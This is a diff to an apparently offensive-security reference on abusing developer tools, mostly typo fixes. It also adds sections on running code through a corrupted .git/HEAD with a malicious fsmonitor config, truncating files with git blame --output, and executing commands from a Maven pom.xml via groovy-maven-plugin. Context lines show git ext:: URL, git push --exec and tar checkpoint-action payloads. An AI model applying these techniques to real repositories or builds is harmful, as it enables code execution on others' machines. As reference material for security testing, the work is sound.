@@ -88,7 +88,7 @@ References:
 
 ### git dependency
 
-One of the sources of gems for `bundler` are git repositories with a gem's source code. Since a git repositories contains a source code `bundler` builds it before installing. Therefore, you can write an arbitrary code that will be executed when running `bundle install`.
+One of the sources of gems for `bundler` is git repositories with a gem's source code. Since a git repository contains a source code `bundler` builds it before installing. Therefore, you can write an arbitrary code that will be executed when running `bundle install`.
 
 {% hint style="info" %}
 You can execute an arbitrary code using both [gemspec](#gem-build) file and [native extensions](#extensions)
@@ -137,7 +137,7 @@ References:
 
 ### path dependency
 
-You can specify that a gem is located in a particular location on the file system. Relative paths are resolved relative to the directory containing the `Gemfile`. Since a git repositories contains a source code `bundler` builds it before installing. Therefore, you can write an arbitrary code that will be executed when running `bundle install`.
+You can specify that a gem is located in a particular location on the file system. Relative paths are resolved relative to the directory containing the `Gemfile`. Since a git repository contains a source code `bundler` builds it before installing. Therefore, you can write an arbitrary code that will be executed when running `bundle install`.
 
 You can specify that a gem is located in a particular location on the file system. Relative paths are resolved relative to the directory containing the `Gemfile`.
 
@@ -280,11 +280,11 @@ References:
 
 Remember that modern versions of Git support setting any config value via [GIT_CONFIG* environment variables](https://git-scm.com/docs/git-config#Documentation/git-config.txt-GITCONFIGCOUNT).
 
-## Abusing a git directory
+## Abusing git directory
 
-A git directory maintains internal state, or metadata, relating to a git repository. It is created on a user's machine when:
+A git directory maintains an internal state, or metadata, relating to a git repository. It is created on a user's machine when:
 
-- The user does `git init` to intialise an empty local repository
+- The user does `git init` to initialise an empty local repository
 - The user does `git clone <repository>` to clone an existing repository from a remote location
 
 The structure of a git directory is documented at https://git-scm.com/docs/gitrepository-layout
@@ -294,7 +294,7 @@ Note that a git directory is often, but not always, a directory named `.git` at 
 - [GIT_DIR](https://git-scm.com/docs/git#Documentation/git.txt-codeGITDIRcode) environment variable or [--git-dir](https://git-scm.com/docs/git#Documentation/git.txt---git-dirltpathgt) command-line option specifies a path to use instead of the default `.git` for the base of the repository.
 - [GIT_COMMON_DIR](https://git-scm.com/docs/git#Documentation/git.txt-codeGITCOMMONDIRcode) environment variable or [commondir](https://git-scm.com/docs/gitrepository-layout#Documentation/gitrepository-layout.txt-commondir) file specifies a path from which non-worktree files will be taken, which are normally in `$GIT_DIR`.
 
-Notice that the [bare repos](https://git-scm.com/docs/git-init#Documentation/git-init.txt---bare) do not have a `.git` directory at all.
+Notice that the [bare repositories](https://git-scm.com/docs/git-init#Documentation/git-init.txt---bare) do not have a `.git` directory at all.
 
 References:
 - [Writeup: gh run download implementation allows overwriting git repository configuration upon artifacts downloading](https://github.com/Metnew/write-ups/blob/e6f65cf6ff60434a37ee230d828336809dd25f5a/rce-gh-cli-run-download/README.md)
@@ -552,6 +552,70 @@ References:
 
 You can achieve an arbitrary write primitive using a crafted `.git/index` file, check an [advisory](https://drivertom.blogspot.com/2021/08/git.html).
 
+### Abuse via .git/HEAD
+
+It is possible to trick Git into loading a configuration from an unintended location by corrupting `.git/HEAD`. In such cases, Git starts looking for repositories in the current folder, which an attacker can fully control, for example, if the current folder is a working tree with all the files of the cloned remote repository. The exploitation flow may look like this:
+
+```bash
+$ git clone https://github.com/remote/repo.git
+$ cd repo
+# Create empty folders to comply with the expected structure of a Git repository
+$ mkdir objects refs worktree
+# Create non-empty HEAD to fake a valid reference
+$ echo "ref: refs/heads/main" > HEAD
+# Prepare a malicious the config file using core.fsmonitor to execute the payload
+$ echo "[core]" > config
+$ echo "\trepositoryformatversion = 0" >> config
+$ echo "\tbare = false" >> config
+$ echo "\tworktree = worktree" >> config
+$ echo $'\tfsmonitor = "echo \\"Pwned as $(id)\\">&2; false"' >> config
+# Corrupt the HEAD file
+$ echo "" > .git/HEAD
+# Exploit
+$ git status
+Pwned as uid=501(0xn3va)
+Pwned as uid=501(0xn3va)
+On branch main
+
+No commits yet
+
+nothing to commit (create/copy files and use "git add" to track)
+```
+
+References:
+
+- [Sonar Blog: Empowering weak primitives: file truncation to code execution with Git](https://www.sonarsource.com/blog/empowering-weak-primitives-file-truncation-to-code-execution-with-git)
+
+## git-blame
+
+{% embed url="https://git-scm.com/docs/git-blame" %}
+
+### --output
+
+`git-blame` has the `--output` option, which is not documented in the manual and is usually present on other git sub-commands. Executing `git blame --output=foo` results in interesting behaviour:
+
+```bash
+$ git init
+$ git blame --output=foo
+usage: git blame [<options>] [<rev-opts>] [<rev>] [--] <file>
+
+    <rev-opts> are documented in git-rev-list(1)
+
+    --incremental         show blame entries as we find them, incrementally
+    -b                    do not show object names of boundary commits (Default: off)
+# ...
+
+# Notice the presence of a new file named foo
+$ ls -la foo
+-rw-r--r--    1 0xn3va  staff     0 Mar 18 20:18 foo
+```
+
+Although the command failed, an empty file named `foo` was created. If a file with the same name already exists, the destination file is truncated. This option provides attackers with an arbitrary file truncation primitive. For example, an attacker can use it to corrupt a critical file in the `.git` folder like `.git/HEAD` and trick Git into loading a configuration from an unintended location, check out the [Abuse via .git/HEAD](#abuse-via-githead) section.
+
+References:
+
+- [Sonar Blog: Empowering weak primitives: file truncation to code execution with Git](https://www.sonarsource.com/blog/empowering-weak-primitives-file-truncation-to-code-execution-with-git)
+
 ## git-clone
 
 {% embed url="https://git-scm.com/docs/git-clone" %}
@@ -562,7 +626,7 @@ You can achieve an arbitrary write primitive using a crafted `.git/index` file, 
 
 ### ext URLs
 
-`git-clone` allows shell commands to be specified in `ext` URLs for remote repositories. For instance, the next example will execute the whoami command to try to connect to a remote repository:
+`git-clone` allows shell commands to be specified in `ext` URLs for remote repositories. For instance, the next example will execute the `whoami` command to try to connect to a remote repository:
 
 ```bash
 $ git clone 'ext::sh -c whoami% >&2'
@@ -603,7 +667,7 @@ References:
 
 ### --no-index
 
-`no-index` tells the git-grep to search files in the current directory that is not managed by Git. In other words, if a working directory is different from a repository one `no-index` allows you to get access to files in the working directiory.
+`no-index` tells the git-grep to search files in the current directory that is not managed by Git. In other words, if a working directory is different from a repository one `no-index` allows you to get access to files in the working directory.
 
 References:
 - [Report: Git flag injection - Search API with scope 'blobs'](https://hackerone.com/reports/682442)
@@ -614,7 +678,7 @@ References:
 
 ### --output
 
-`output` define a specific file to output instead of stdout. You can use this to rewrite arbitrary files.
+`output` defines a specific file to output instead of stdout. You can use this to rewrite arbitrary files.
 
 ```bash
 $ git log --output=/tmp/arbitrary_file
@@ -649,6 +713,69 @@ $ git push --exec=payload.sh username/repo main
 $ git push --receive-pack=payload.sh main
 ```
 
+# maven
+
+Execution of arbitrary commands or code during `mvn <PHASE>` execution is possible through the use of various plugins such as [exec-maven-plugin](https://www.mojohaus.org/exec-maven-plugin/) or [groovy-maven-plugin](https://groovy.github.io/gmaven/groovy-maven-plugin/index.html). In order to execute a malicious payload using the `groovy-maven-plugin` plugin during the phase `<PHASE>` you can use the following configuration:
+
+```xml
+<plugin>
+  <groupId>org.codehaus.gmaven</groupId>
+  <artifactId>groovy-maven-plugin</artifactId>
+  <executions>
+    <execution>
+      <phase><!-- PHASE_HERE --></phase>
+      <goals>
+        <goal>execute</goal>
+      </goals>
+      <configuration>
+        <source>
+          print "cmdname arg1 arg2".execute().text
+        </source>
+      </configuration>
+    </execution>
+  </executions>
+</plugin>
+```
+
+For example, you can execute the plugin during `mvn initialize` or `mvn compile` using the following `pom.xml` file:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<project>
+  <modelVersion>4.0.0</modelVersion>
+ 
+  <groupId>com.mycompany.app</groupId>
+  <artifactId>my-app</artifactId>
+  <version>1</version>
+  
+  <build>
+    <plugins>
+        <plugin>
+          <groupId>org.codehaus.gmaven</groupId>
+          <artifactId>groovy-maven-plugin</artifactId>
+            <executions>
+              <execution>
+                <phase>initialize</phase>
+                <goals>
+                  <goal>execute</goal>
+                </goals>
+                <configuration>
+                  <source>
+                    print "cmdname arg1 arg2".execute().text
+                  </source>
+                </configuration>
+              </execution>
+          </executions>
+        </plugin>
+     </plugins>   
+  </build>
+</project>
+```
+
+References:
+
+- [Apache Maven Project: Introduction to the Build Lifecycle](https://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html)
+
 # npm scripts
 
 The [scripts](https://docs.npmjs.com/cli/v7/using-npm/scripts) property of the `package.json` file supports a number of built-in scripts and their preset life cycle events as well as arbitrary scripts. These all can be executed using [npm run-script or npm run for short](https://docs.npmjs.com/cli/v7/commands/npm-run-script). 
@@ -657,7 +784,7 @@ The [scripts](https://docs.npmjs.com/cli/v7/using-npm/scripts) property of the `
 Scripts from dependencies can be run with `npm explore <pkg> -- npm run <stage>`
 {% endhint %}
 
-Pre and post commands with matching names will be run for those as well (e.g. premyscript, myscript, postmyscript). To create pre or post scripts for any scripts defined in the `scripts` section of the `package.json`, simply create another script with a matching name and add `pre` or `post` to the beginning of them.
+Pre and post commands with matching names will be run for those as well (e.g. `premyscript`, `myscript`, `postmyscript`). To create pre or post scripts for any scripts defined in the `scripts` section of the `package.json`, simply create another script with a matching name and add `pre` or `post` to the beginning of them.
 
 In the following example `npm run compress` would execute these scripts as described.
 
@@ -679,15 +806,15 @@ There are some special life cycle scripts that happen only in certain situations
     - Runs BEFORE the package is published
     - Runs on local `npm install` without any arguments
     - Run AFTER `prepublish`, but BEFORE `prepublishOnly`
-    - NOTE: If a package being installed through git contains a `prepare` script, its `dependencies` and `devDependencies` will be installed, and the prepare script will be run, before the package is packaged and installed
+    - NOTE: If a package being installed through git contains a `prepare` script, its `dependencies` and `devDependencies` will be installed, and the prepare script will be run before the package is packaged and installed
     - As of `npm@7` these scripts run in the background. To see the output, run with: `--foreground-scripts`
 - `prepublish` ([DEPRECATED](https://docs.npmjs.com/cli/v7/using-npm/scripts#prepare-and-prepublish))
     - Does not run during `npm publish`, but does run during `npm ci` and `npm install`
 - `prepublishOnly`
     - Runs BEFORE the package is prepared and packed, ONLY on `npm publish`
 - `prepack`
-    - Runs BEFORE a tarball is packed (on `npm pack`, `npm publish`, and when installing a git dependencies)
-    - NOTE: `npm run pack` is NOT the same as `npm pack`. `npm run pack` is an arbitrary user defined script name, where as, `npm pack` is a CLI defined command
+    - Runs BEFORE a tarball is packed (on `npm pack`, `npm publish`, and when installing git dependencies)
+    - NOTE: `npm run pack` is NOT the same as `npm pack`. `npm run pack` is an arbitrary user-defined script name, whereas, `npm pack` is a CLI-defined command
 - `postpack`
     - Runs AFTER the tarball has been generated but before it is moved to its final destination (if at all, publish does not save the tarball locally)
 
@@ -826,12 +953,11 @@ When `pip install` is run the `PostInstallCommand.run` method will be invoked.
 References:
 - [0wned - Code execution via Python package installation](https://github.com/mschwager/0wned)
 
-
 # tar
 
 ## Checkpoints
 
-A [checkpoint](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html) is a moment of time before writing nth record to the archive (a write checkpoint), or before reading nth record from the archive (a read checkpoint). [Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html) allow to periodically execute arbitrary actions.
+A [checkpoint](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html) is a moment of time before writing nth record to the archive (a write checkpoint), or before reading nth record from the archive (a read checkpoint). [Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html) allow periodically executing arbitrary actions.
 
 ```bash
 $ tar cf archieve.tar --checkpoint=1 --checkpoint-action="exec=echo 'arbitrary payload here'" foo 
